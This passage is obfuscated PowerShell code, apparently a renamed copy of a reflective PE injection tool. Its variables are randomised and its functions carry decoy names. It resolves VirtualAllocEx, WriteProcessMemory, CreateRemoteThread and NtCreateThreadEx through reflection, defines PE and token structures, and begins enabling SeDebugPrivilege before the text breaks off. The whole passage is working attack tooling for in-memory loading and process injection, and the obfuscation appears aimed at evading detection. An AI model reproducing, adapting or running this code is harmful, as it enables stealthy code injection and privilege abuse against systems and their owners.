		$PVtshc9ShixoeKK.DefineField('Name', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('Base', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$9fdnwxkXLSRZmGt = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $9fdnwxkXLSRZmGt
		

		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('LUID', $dquJDhf9OLQn9Yd, [System.ValueType], 8)
		$PVtshc9ShixoeKK.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		

		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('LUID_AND_ATTRIBUTES', $dquJDhf9OLQn9Yd, [System.ValueType], 12)
		$PVtshc9ShixoeKK.DefineField('Luid', $LUID, 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$F9bGMiIHilrmWpX = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $F9bGMiIHilrmWpX
		

		$dquJDhf9OLQn9Yd = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('TOKEN_PRIVILEGES', $dquJDhf9OLQn9Yd, [System.ValueType], 16)
		$PVtshc9ShixoeKK.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$PVtshc9ShixoeKK.DefineField('Privileges', $F9bGMiIHilrmWpX, 'Public') | Out-Null
		$DbNvV9xnGBrQSCn = $PVtshc9ShixoeKK.CreateType()
		$robWSZfqWDtAXZH | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $DbNvV9xnGBrQSCn

		return $robWSZfqWDtAXZH
	}

	Function Prince
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}

	Function zenith
	{
		$Y9kecWoe9UV9zmX = New-Object System.Object
		
		$ScLbev9oRnlvs9U = spectroscope kernel32.dll VirtualAlloc
		$jGZLgFjrEJACNIR = imitates @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$wWafzce9oEIpffh = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ScLbev9oRnlvs9U, $jGZLgFjrEJACNIR)
		$Y9kecWoe9UV9zmX | Add-Member NoteProperty -Name VirtualAlloc -Value $wWafzce9oEIpffh
		
		$yCCHoaKDNFHKZuK = spectroscope kernel32.dll VirtualAllocEx
		$P9XR9GhuBQVeClG = imitates @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$vI9rHTUCAcjKmwM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yCCHoaKDNFHKZuK, $P9XR9GhuBQVeClG)
		$Y9kecWoe9UV9zmX | Add-Member NoteProperty -Name VirtualAllocEx -Value $vI9rHTUCAcjKmwM
		
		$su9gNAuaAOPkNof = spectroscope msvcrt.dll memcpy
		$cFfp9sxQCIdogGP = imitates @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$aHNSBRuARqPpKha = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($su9gNAuaAOPkNof, $cFfp9sxQCIdogGP)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name memcpy -Value $aHNSBRuARqPpKha
		
		$rvSUNdjSuYhQceO = spectroscope msvcrt.dll memset
		$VlWhLLpUpNK9gYB = imitates @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$DzMYrgPlUAI9LSW = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($rvSUNdjSuYhQceO, $VlWhLLpUpNK9gYB)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name memset -Value $DzMYrgPlUAI9LSW
		
		$HbX9LmOUR9bLArm = spectroscope kernel32.dll LoadLibraryA
		$JJXreFucPuItxQj = imitates @([String]) ([IntPtr])
		$DGOKUNeBd9mmGIz = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HbX9LmOUR9bLArm, $JJXreFucPuItxQj)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $DGOKUNeBd9mmGIz
		
		$Zxzhkab9mtSECAE = spectroscope kernel32.dll GetProcAddress
		$osqbJWp9WvSyJrw = imitates @([IntPtr], [String]) ([IntPtr])
		$woKYIDgECpPEOh9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($Zxzhkab9mtSECAE, $osqbJWp9WvSyJrw)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $woKYIDgECpPEOh9
		
		$9EMgZvSODARDprQ = spectroscope kernel32.dll GetProcAddress
		$LMVPHjLKQYSBKj9 = imitates @([IntPtr], [IntPtr]) ([IntPtr])
		$lZEgdt9CjNFuu9x = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($9EMgZvSODARDprQ, $LMVPHjLKQYSBKj9)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $lZEgdt9CjNFuu9x
		
		$TlzfVCQSHhWjYsF = spectroscope kernel32.dll VirtualFree
		$zBhcLcXiVlTNZJo = imitates @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$EdDRW9cumWmZzTq = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TlzfVCQSHhWjYsF, $zBhcLcXiVlTNZJo)
		$Y9kecWoe9UV9zmX | Add-Member NoteProperty -Name VirtualFree -Value $EdDRW9cumWmZzTq
		
		$naakrPxbCESiKj9 = spectroscope kernel32.dll VirtualFreeEx
		$B9QfJqatnoCBpWr = imitates @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$fODtnTNJicNu9jx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($naakrPxbCESiKj9, $B9QfJqatnoCBpWr)
		$Y9kecWoe9UV9zmX | Add-Member NoteProperty -Name VirtualFreeEx -Value $fODtnTNJicNu9jx
		
		$GFgmcIhmxNLGdAO = spectroscope kernel32.dll VirtualProtect
		$yv9e9yqvuJKmmE9 = imitates @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$bOdnrIKxwx9obgU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GFgmcIhmxNLGdAO, $yv9e9yqvuJKmmE9)
		$Y9kecWoe9UV9zmX | Add-Member NoteProperty -Name VirtualProtect -Value $bOdnrIKxwx9obgU
		
		$IXOqkXongsW9PbI = spectroscope kernel32.dll GetModuleHandleA
		$KwCWMHxhbAaDBYC = imitates @([String]) ([IntPtr])
		$S9UqkJjjUiuMmiw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IXOqkXongsW9PbI, $KwCWMHxhbAaDBYC)
		$Y9kecWoe9UV9zmX | Add-Member NoteProperty -Name GetModuleHandle -Value $S9UqkJjjUiuMmiw
		
		$wfT9sTHMkwvpXWu = spectroscope kernel32.dll FreeLibrary
		$YSOYIuHwqxPUSMs = imitates @([Bool]) ([IntPtr])
		$JPRkwgApLMHXlLA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($wfT9sTHMkwvpXWu, $YSOYIuHwqxPUSMs)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $JPRkwgApLMHXlLA
		
		$EfLQmSbYciCihQv = spectroscope kernel32.dll OpenProcess
	    $FTWyNQOdlBJxJDp = imitates @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $kKdl9Oti9szcOJN = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($EfLQmSbYciCihQv, $FTWyNQOdlBJxJDp)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $kKdl9Oti9szcOJN
		
		$FnYuUPOX9HVlrOs = spectroscope kernel32.dll WaitForSingleObject
	    $asonP9nfxzysNcd = imitates @([IntPtr], [UInt32]) ([UInt32])
	    $f9IwSqNFZflk9AU = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FnYuUPOX9HVlrOs, $asonP9nfxzysNcd)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $f9IwSqNFZflk9AU
		
		$ORACLTeydkkb9cr = spectroscope kernel32.dll WriteProcessMemory
        $9AEOQIpaZSrqtcv = imitates @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $bUXfUUto9jWEeLb = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ORACLTeydkkb9cr, $9AEOQIpaZSrqtcv)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $bUXfUUto9jWEeLb
		
		$BUNIaWkvmElFLcF = spectroscope kernel32.dll ReadProcessMemory
        $99WKeLhbyCOWTwK = imitates @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $BUdXCsokTPcP9XL = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BUNIaWkvmElFLcF, $99WKeLhbyCOWTwK)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $BUdXCsokTPcP9XL
		
		$TeALJlNYQmRWXba = spectroscope kernel32.dll CreateRemoteThread
        $o9gflYsUIZUAdAJ = imitates @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $99MSsLbPsFu9joe = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($TeALJlNYQmRWXba, $o9gflYsUIZUAdAJ)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $99MSsLbPsFu9joe
		
		$YuHxPyfBDTR9FIB = spectroscope kernel32.dll GetExitCodeThread
        $EruVXVDSLRqcjYp = imitates @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $LMIE9CPYwhoRJCD = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($YuHxPyfBDTR9FIB, $EruVXVDSLRqcjYp)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $LMIE9CPYwhoRJCD
		
		$UQsCaNE9BZdCG9m = spectroscope Advapi32.dll OpenThreadToken
        $mzfRFqMGREiwAOg = imitates @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $phCTCkWOZAH9wt9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($UQsCaNE9BZdCG9m, $mzfRFqMGREiwAOg)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $phCTCkWOZAH9wt9
		
		$cLTbaTGoMvaNZTv = spectroscope kernel32.dll GetCurrentThread
        $EtVXFaIkkttwWwL = imitates @() ([IntPtr])
        $NdvL9wff9qTBu9V = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cLTbaTGoMvaNZTv, $EtVXFaIkkttwWwL)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $NdvL9wff9qTBu9V
		
		$9yKRvUqNPmcVExg = spectroscope Advapi32.dll AdjustTokenPrivileges
        $SG9JFdUiapPBmlh = imitates @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $vEGdSdJHnnblIi9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($9yKRvUqNPmcVExg, $SG9JFdUiapPBmlh)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $vEGdSdJHnnblIi9
		
		$GORZumxUlWgFuZT = spectroscope Advapi32.dll LookupPrivilegeValueA
        $GvbjBvRlVOCuSsY = imitates @([String], [String], [IntPtr]) ([Bool])
        $9Nnr9qJZUfLRJdT = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GORZumxUlWgFuZT, $GvbjBvRlVOCuSsY)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $9Nnr9qJZUfLRJdT
		
		$OmkhqWtMUrOaaG9 = spectroscope Advapi32.dll ImpersonateSelf
        $wiLZ9gratN9WzCc = imitates @([Int32]) ([Bool])
        $tnQgKPXDFmNmHGy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OmkhqWtMUrOaaG9, $wiLZ9gratN9WzCc)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $tnQgKPXDFmNmHGy
		

        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $QZgMYCgjAMJ9wsu = spectroscope NtDll.dll NtCreateThreadEx
            $FtXZyhlahniFPUV = imitates @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $lMdSuUJDjsn99En = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($QZgMYCgjAMJ9wsu, $FtXZyhlahniFPUV)
		    $Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $lMdSuUJDjsn99En
        }
		
		$NBnAAI9VWkaoWrz = spectroscope Kernel32.dll IsWow64Process
        $rhFip9vGxsgl9vN = imitates @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $NxdrxHvqmPrQhlv = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NBnAAI9VWkaoWrz, $rhFip9vGxsgl9vN)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $NxdrxHvqmPrQhlv
		
		$yFsNjxKJFHy9RwO = spectroscope Kernel32.dll CreateThread
        $hRoFDOssAYWJucc = imitates @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $gJJqlkyxcqENNxt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($yFsNjxKJFHy9RwO, $hRoFDOssAYWJucc)
		$Y9kecWoe9UV9zmX | Add-Member -MemberType NoteProperty -Name CreateThread -Value $gJJqlkyxcqENNxt
	
		$fjZxCGVe9uH9Ih9 = spectroscope kernel32.dll VirtualFree
		$BCn9ymx9YjAGjxW = imitates @([IntPtr])
		$DjXCmHnnx9QyBui = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fjZxCGVe9uH9Ih9, $BCn9ymx9YjAGjxW)
		$Y9kecWoe9UV9zmX | Add-Member NoteProperty -Name LocalFree -Value $DjXCmHnnx9QyBui

		return $Y9kecWoe9UV9zmX
	}


			






	Function conditions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$xzLjyIiNumCEEDo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$M999FhGLrU9OUTR
		)
		
		[Byte[]]$Vu9ZSqyjSOmPVWY = [BitConverter]::GetBytes($xzLjyIiNumCEEDo)
		[Byte[]]$mdCHeOADeIHcJpW = [BitConverter]::GetBytes($M999FhGLrU9OUTR)
		[Byte[]]$oEYTCipp9Jcqrac = [BitConverter]::GetBytes([UInt64]0)

		if ($Vu9ZSqyjSOmPVWY.Count -eq $mdCHeOADeIHcJpW.Count)
		{
			$KmqaOTL9NXBqnJo = 0
			for ($i = 0; $i -lt $Vu9ZSqyjSOmPVWY.Count; $i++)
			{
				$Val = $Vu9ZSqyjSOmPVWY[$i] - $KmqaOTL9NXBqnJo

				if ($Val -lt $mdCHeOADeIHcJpW[$i])
				{
					$Val += 256
					$KmqaOTL9NXBqnJo = 1
				}
				else
				{
					$KmqaOTL9NXBqnJo = 0
				}
				
				
				[UInt16]$Sum = $Val - $mdCHeOADeIHcJpW[$i]

				$oEYTCipp9Jcqrac[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($oEYTCipp9Jcqrac, 0)
	}
	

	Function protestation
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$xzLjyIiNumCEEDo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$M999FhGLrU9OUTR
		)
		
		[Byte[]]$Vu9ZSqyjSOmPVWY = [BitConverter]::GetBytes($xzLjyIiNumCEEDo)
		[Byte[]]$mdCHeOADeIHcJpW = [BitConverter]::GetBytes($M999FhGLrU9OUTR)
		[Byte[]]$oEYTCipp9Jcqrac = [BitConverter]::GetBytes([UInt64]0)

		if ($Vu9ZSqyjSOmPVWY.Count -eq $mdCHeOADeIHcJpW.Count)
		{
			$KmqaOTL9NXBqnJo = 0
			for ($i = 0; $i -lt $Vu9ZSqyjSOmPVWY.Count; $i++)
			{

				[UInt16]$Sum = $Vu9ZSqyjSOmPVWY[$i] + $mdCHeOADeIHcJpW[$i] + $KmqaOTL9NXBqnJo

				$oEYTCipp9Jcqrac[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$KmqaOTL9NXBqnJo = 1
				}
				else
				{
					$KmqaOTL9NXBqnJo = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($oEYTCipp9Jcqrac, 0)
	}
	

	Function caparisoned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$xzLjyIiNumCEEDo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$M999FhGLrU9OUTR
		)
		
		[Byte[]]$Vu9ZSqyjSOmPVWY = [BitConverter]::GetBytes($xzLjyIiNumCEEDo)
		[Byte[]]$mdCHeOADeIHcJpW = [BitConverter]::GetBytes($M999FhGLrU9OUTR)

		if ($Vu9ZSqyjSOmPVWY.Count -eq $mdCHeOADeIHcJpW.Count)
		{
			for ($i = $Vu9ZSqyjSOmPVWY.Count-1; $i -ge 0; $i--)
			{
				if ($Vu9ZSqyjSOmPVWY[$i] -gt $mdCHeOADeIHcJpW[$i])
				{
					return $true
				}
				elseif ($Vu9ZSqyjSOmPVWY[$i] -lt $mdCHeOADeIHcJpW[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	

	Function dinghy
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$kwCibgn9DfOTg9L = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($kwCibgn9DfOTg9L, 0))
	}
	
	
	Function tallyhoing
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$thZCgeBloBSATRw,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$SMCjq9ZkBEd9CDY = [IntPtr](protestation ($StartAddress) ($Size))
		
		$9sWMxMManpAHbjO = $PEInfo.EndAddress
		
		if ((caparisoned ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $thZCgeBloBSATRw"
		}
		if ((caparisoned ($SMCjq9ZkBEd9CDY) ($9sWMxMManpAHbjO)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $thZCgeBloBSATRw"
		}
	}
	
	
	Function Wheaties
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$lEjENVUfYtGCRuC
		)
	
		for ($aRoZEetPrjiQvFQ = 0; $aRoZEetPrjiQvFQ -lt $Bytes.Length; $aRoZEetPrjiQvFQ++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($lEjENVUfYtGCRuC, $aRoZEetPrjiQvFQ, $Bytes[$aRoZEetPrjiQvFQ])
		}
	}
	


	Function imitates
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $lmaDwpkUsVw9AbD = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $nIVsnMejpezx9OG = [AppDomain]::CurrentDomain
	    $LjTh9UfJHKpdroJ = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $zCtoQZQOHDSBcIv = $nIVsnMejpezx9OG.DefineDynamicAssembly($LjTh9UfJHKpdroJ, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $BgziPuxjGuFGcQq = $zCtoQZQOHDSBcIv.DefineDynamicModule('InMemoryModule', $false)
	    $PVtshc9ShixoeKK = $BgziPuxjGuFGcQq.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $jssx9MuELFPXCEz = $PVtshc9ShixoeKK.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $lmaDwpkUsVw9AbD)
	    $jssx9MuELFPXCEz.SetImplementationFlags('Runtime, Managed')
	    $otoMYkqjqsRuIQw = $PVtshc9ShixoeKK.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $lmaDwpkUsVw9AbD)
	    $otoMYkqjqsRuIQw.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $PVtshc9ShixoeKK.CreateType()
	}



	Function spectroscope
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $cBt9IKLmECehMlf
	    )


	    $Cah9MFuWhzlPOfQ = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $jQeotRVwrJtskhS = $Cah9MFuWhzlPOfQ.GetType('Microsoft.Win32.UnsafeNativeMethods')

	    $S9UqkJjjUiuMmiw = $jQeotRVwrJtskhS.GetMethod('GetModuleHandle')

        $woKYIDgECpPEOh9 = $jQeotRVwrJtskhS.GetMethod('GetProcAddress',[Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

	    $YnvPs9nprrOLyE9 = $S9UqkJjjUiuMmiw.Invoke($null, @($Module))
	    $9OOwvnaxrvwoETs = New-Object IntPtr
	    $9gdZJET99GZG9xR = New-Object System.Runtime.InteropServices.HandleRef($9OOwvnaxrvwoETs, $YnvPs9nprrOLyE9)


	    Write-Output $woKYIDgECpPEOh9.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$9gdZJET99GZG9xR, $cBt9IKLmECehMlf))
	}
	
	
	Function raffles
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Y9kecWoe9UV9zmX,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$robWSZfqWDtAXZH,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$psWOAvHVyQRwl9D = $Y9kecWoe9UV9zmX.GetCurrentThread.Invoke()
		if ($psWOAvHVyQRwl9D -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$bDuxnd9BxZeBAMs = [IntPtr]::Zero
		[Bool]$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.OpenThreadToken.Invoke($psWOAvHVyQRwl9D, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$bDuxnd9BxZeBAMs)
		if ($gtfwrZEdKIxfWbP -eq $false)
		{
			$MPoBck9NfvXbGrG = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($MPoBck9NfvXbGrG -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.ImpersonateSelf.Invoke(3)
				if ($gtfwrZEdKIxfWbP -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.OpenThreadToken.Invoke($psWOAvHVyQRwl9D, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$bDuxnd9BxZeBAMs)
				if ($gtfwrZEdKIxfWbP -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $MPoBck9NfvXbGrG"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$robWSZfqWDtAXZH.LUID))
		$gtfwrZEdKIxfWbP = $Y9kecWoe9UV9zmX.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($gtfwrZEdKIxfWbP -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
